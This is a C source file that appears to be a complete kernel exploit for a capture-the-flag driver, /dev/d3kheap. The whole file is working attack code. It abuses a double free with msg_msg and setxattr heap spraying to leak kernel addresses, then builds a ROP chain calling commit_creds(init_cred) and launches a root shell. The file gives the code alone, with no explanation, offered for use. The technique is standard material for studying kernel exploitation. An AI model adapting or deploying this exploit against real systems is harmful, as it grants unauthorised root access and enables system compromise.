#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define PREPARE_KERNEL_CRED 0xffffffff810d2ac0
#define INIT_CRED 0xffffffff82c6d580
#define COMMIT_CREDS 0xffffffff810d25c0
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0
#define POP_RDI_RET 0xffffffff810938f0
#define SECONDARY_STARTUP_64 0xffffffff81000040

size_t user_cs, user_ss, user_sp, user_rflags;
size_t kernel_offset, kernel_base = 0xffffffff81000000;
size_t prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;

int fd;
int pipe_fd, pipe_fd1[2], pipe_fd2[2];

void ErrExit(char* err_msg)
{
	puts(err_msg);
	exit(-1);
}

void add()
{
	ioctl(fd, 0x1234);
}

void delete()
{
	ioctl(fd, 0xdead);
}

void save_status()
{
	__asm__(
	"mov user_cs, cs;"
	"mov user_ss, ss;"
	"mov user_sp, rsp;"
	"pushf;"
	"pop user_rflags;"
	);
        printf("\033[34m\033[1m[+] save the state success!\033[0m\n");
}

void get_shell()
{
	if (getuid() == 0)
	{
		printf("\033[32m\033[1m[+] get root shell !\033[0m\n");
		system("/bin/sh");
		//char *shell = "/bin/sh";
		//char *args[] = {shell, NULL};
		//execve(shell, args, NULL);
	}
	else
	{
		printf("\033[31m\033[1m[-] get shell error !\033[0m\n");
		exit(0);
	}
}

size_t kernelLeakQuery(size_t kernel_text_leak)
{
	size_t kernel_offset = 0xdeadbeef;
	switch (kernel_text_leak & 0xfff)
	{
		case 0x6e9:
			kernel_offset = kernel_text_leak - 0xffffffff812b76e9;
   			break;
		case 0x980:
			kernel_offset = kernel_text_leak - 0xffffffff82101980;
			break;
		case 0x440:
			kernel_offset = kernel_text_leak - 0xffffffff82e77440;
			break;
		case 0xde7:
			kernel_offset = kernel_text_leak - 0xffffffff82411de7;
			break;
		case 0x4f0:
			kernel_offset = kernel_text_leak - 0xffffffff817894f0;
			break;
		case 0xc90:
			kernel_offset = kernel_text_leak - 0xffffffff833fac90;
			break;
		case 0x785:
			kernel_offset = kernel_text_leak - 0xffffffff823c3785;
			break;
		case 0x990:
			kernel_offset = kernel_text_leak - 0xffffffff810b2990;
			break;
		case 0x900:
			kernel_offset = kernel_text_leak - 0xffffffff82e49900;
			break;
		case 0x8b4:
			kernel_offset = kernel_text_leak - 0xffffffff8111b8b4;
			break;
		case 0xc40:
			kernel_offset = kernel_text_leak - 0xffffffff8204ac40;
			break;
		case 0x320:
			kernel_offset = kernel_text_leak - 0xffffffff8155c320;
			break;
		case 0xee0:
			kernel_offset = kernel_text_leak - 0xffffffff810d6ee0;
			break;
		case 0x5e0:
			kernel_offset = kernel_text_leak - 0xffffffff810e55e0;
			break;
		case 0xe80:
			kernel_offset = kernel_text_leak - 0xffffffff82f05e80;
			break;
		case 0x260:
			kernel_offset = kernel_text_leak - 0xffffffff82ec0260;
			break;
		default:
			puts("[-] fill up your dict!");
			break;
	}
	if ((kernel_offset % 0x100000) != 0)
		kernel_offset = 0xdeadbeef;
	return kernel_offset;
}

typedef struct
{
	long mtype;
	char mtext[1];
}msg;

struct list_head
{
	struct list_head *next, *prev;
};

/* one msg_msg structure for each message */
struct msg_msg 
{
	struct list_head m_list;
	long m_type;
	size_t m_ts;        /* message text size */
	void *next;         /* struct msg_msgseg *next; */
	void *security;     /* NULL without SELinux */
	/* the actual message follows immediately */
};

int main()
{
	size_t *buf;
	size_t kernel_heap_leak;
	size_t kernel_heap_search;
	size_t kernel_text_leak;
	size_t page_offset_base_guess;
	size_t msg_offset, msg_offset_count;
	size_t fake_ops_addr, fake_ops_offset, kmsg_addr;
	int kmsg_idx;
	int ms_qid[0x100];
	int ret;

	cpu_set_t cpu_set;

	CPU_ZERO(&cpu_set);
	CPU_SET(0, &cpu_set);
	sched_setaffinity(0, sizeof(cpu_set), &cpu_set);

	save_status();
	
	buf = (size_t*)malloc(0x4000);
	memset(buf, 0, 0x4000);

	fd = open("/dev/d3kheap", O_RDONLY);
	if(fd < 0)
		ErrExit("[-] open d3heap error");

	add();
	delete();
	
	for (int i = 0; i < 5; i++)
	{
		ms_qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
		if (ms_qid[i] < 0)
		{
			puts("[x] msgget!");
			return -1;
		}
	}
    
	for (int i = 0; i < 5; i++)
	{
		memset(buf, 'A'+i, 0X1000 - 8);
		ret = msgsnd(ms_qid[i], buf, 1024 - 0x30, 0);
		if (ret < 0)
		{
			puts("[x] msgsnd!");
			return -1;
		}
	}
	
	delete();
	
	memset(buf, 'B', 0x1000);
	((struct msg_msg*) buf)->m_list.next = NULL;
	((struct msg_msg*) buf)->m_list.prev = NULL;
	((struct msg_msg*) buf)->m_type = 0;
	((struct msg_msg*) buf)->m_ts = 0x1000 - 0x30;
	((struct msg_msg*) buf)->next = NULL;
	((struct msg_msg*) buf)->security = NULL;

	setxattr("/exp", "FXC", buf, 1024-0x30, 0);

	ret = msgrcv(ms_qid[0], buf, 0x1000 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
	if (ret < 0)
		ErrExit("[-] msgrcv error");

	for (int i = 0; i < ((0x1000 - 0x30) / 8); i++)
	{
		printf("[----data dump----][%3d] 0x%lx\n", i, buf[i]);
		if (((buf[i] & 0xffff000000000000) == 0xffff000000000000) && !kernel_heap_leak && (buf[i + 3] == (1024 - 0x30)))
		{
			printf("\033[32m\033[1m[+] We got heap leak! kheap: 0x%lx\033[0m\n", buf[i]);
			kernel_heap_leak = buf[i];
			kmsg_idx = (int)(((char*)(&buf[i + 2]))[0] - 'A');
			fake_ops_offset = i * 8 + 0x30 - 8;
		}
		if (((buf[i] & 0xffffffff00000000) == 0xffffffff00000000) && !kernel_text_leak)
		{
			printf("\033[32m\033[1m[+] We got text leak! ktext: 0x%lx\033[0m\n", buf[i]);
			kernel_offset = kernelLeakQuery(buf[i]);
			printf("\033[32m\033[1m[+] kernel offset: 0x%lx\033[0m\n", kernel_offset);
			if (kernel_offset != 0xdeadbeef)
			{
				kernel_text_leak = buf[i];
				kernel_base += kernel_offset;
			}
		}
		if (kernel_text_leak && kernel_heap_leak)
			break;
	}

	if (!kernel_heap_leak)
		ErrExit("\033[31m\033[1m[-] Failed to leak kernel heap!\033[0m\n");

	//if (!kernel_text_leak)
	//	ErrExit("\033[31m\033[1m[-] Failed to leak kernel text!\033[0m\n");

	((struct msg_msg*) buf)->m_list.next = NULL;
	((struct msg_msg*) buf)->m_list.prev = NULL;
	((struct msg_msg*) buf)->m_type = 0;
	((struct msg_msg*) buf)->m_ts = 0x2000 - 0x30 -8;
	((struct msg_msg*) buf)->next = (void*)(kernel_heap_leak - 8); // q_messages - 8
	((struct msg_msg*) buf)->security = NULL;

	setxattr("/exp", "FXC", buf, 1024-0x30, 0);

	ret = msgrcv(ms_qid[0], buf, 0x2000 - 0x30 -8, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
	if (ret < 0)
		ErrExit("[-] msgrcv error");

	kmsg_addr = buf[(0x1000 - 0x30) / 8 + 1];
	fake_ops_addr = kmsg_addr - fake_ops_offset;
	printf("\033[32m\033[1m[+] UAF as fake ops addr at: 0x%lx, cal by msg idx: %d at addr: 0x%lx\033[0m\n", fake_ops_addr, kmsg_idx, kmsg_addr);

	kernel_heap_search = kmsg_addr - 8;
	for (int leaking_times = 0; !kernel_text_leak; leaking_times++)
	{
		printf("[*] per leaking, no.%d time(s)\n", leaking_times);
    
		((struct msg_msg*) buf)->m_list.next = NULL;
		((struct msg_msg*) buf)->m_list.prev = NULL;
		((struct msg_msg*) buf)->m_type = 0;
		((struct msg_msg*) buf)->m_ts = 0x2000 - 0x30;
		((struct msg_msg*) buf)->next = (void*)kernel_heap_search;
		((struct msg_msg*) buf)->security = NULL;

		setxattr("/exp", "FXC", buf, 1024-0x30, 0);
		printf("[*] Now searching: 0x%lx\n", kernel_heap_search);

		ret = msgrcv(ms_qid[0], buf, 0x2000 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
        	if (ret < 0)
			ErrExit("[-] msgrcv error");

		msg_offset_count = 0;
		msg_offset = 0xdeadbeefbad4f00d;
		for (int i = (0x1000 - 0x30) / 8; i < (0x2000 - 0x30) / 8; i++)
		{
			printf("[----data dump----][%3d] 0x%lx\n", i, buf[i]);
			if ((buf[i] > 0xffffffff81000000) && (buf[i] < 0xffffffffbfffffff) && !kernel_text_leak)
			{
				printf("\033[32m\033[1m[+] We got text leak! ktext: 0x%lx\033[0m\n", buf[i]);
				kernel_offset = kernelLeakQuery(buf[i]);
				if (kernel_offset != 0xdeadbeef)
				{
					kernel_text_leak = buf[i];
					kernel_base += kernel_offset;
					break;
				}
			}
			if (!buf[i])
				msg_offset = msg_offset_count * 8;
			msg_offset_count++;
		}

		if (kernel_text_leak)
			break;

		if (msg_offset == 0xdeadbeefbad4f00d)
			ErrExit("[-] Failed to find next valid foothold!");

		kernel_heap_search += msg_offset;// to make the msg_msg->next == NULL, search from the last NULL
	}

	printf("\033[32m\033[1m[+] kernel offset: 0x%lx\033[0m\n", kernel_offset);
	printf("\033[32m\033[1m[+] kernel base: 0x%lx\033[0m\n", kernel_base);

	((struct msg_msg*) buf)->m_list.next = (struct list_head *)kernel_heap_search; // a pointer to the heap is available, list_del (aka unlink) is easy to pass
	((struct msg_msg*) buf)->m_list.prev = (struct list_head *)kernel_heap_search;
	((struct msg_msg*) buf)->m_type = 0;
	((struct msg_msg*) buf)->m_ts = 1024 - 0x30;
	((struct msg_msg*) buf)->next = NULL;
	((struct msg_msg*) buf)->security = NULL;

	// while the kmem_cache->offset is not 0, we can easily repair the header of msg_msg
	setxattr("/exp", "FXC", buf, 1024-0x30, 0);

	ret = msgrcv(ms_qid[kmsg_idx], buf, 1024 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR); // add a obj to pass detection in set_freepointer() in free_msg
	if (ret < 0)
		ErrExit("[-] msgrcv error");

	ret = msgrcv(ms_qid[0], buf, 1024 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR); // constructing A->B->A
	if (ret < 0)
		ErrExit("[-] msgrcv error");

	pipe(pipe_fd1);
	pipe_fd = pipe_fd1[1];
	pipe(pipe_fd2);

	memset(buf, 'B', 0x1000);
	buf[2] = fake_ops_addr;
	buf[1] = 0xffffffff812dbede + kernel_offset; // push rsi ; pop rsp ; pop 4 val ; ret

	// construct ROP
	int rop_idx = 4;
	buf[rop_idx++] = POP_RDI_RET + kernel_offset;
	buf[rop_idx++] = INIT_CRED + kernel_offset;
	buf[rop_idx++] = COMMIT_CREDS + kernel_offset;
	buf[rop_idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x16 + kernel_offset;
	buf[rop_idx++] = 0;
	buf[rop_idx++] = 0;
	buf[rop_idx++] = (size_t)get_shell;
	buf[rop_idx++] = user_cs;
	buf[rop_idx++] = user_rflags;
	buf[rop_idx++] = user_sp;
	buf[rop_idx++] = user_ss;

	setxattr("/exp", "FXC", buf, 1024-0x30, 0);

	close(pipe_fd1[0]);
	close(pipe_fd1[1]);

	return 0;
}
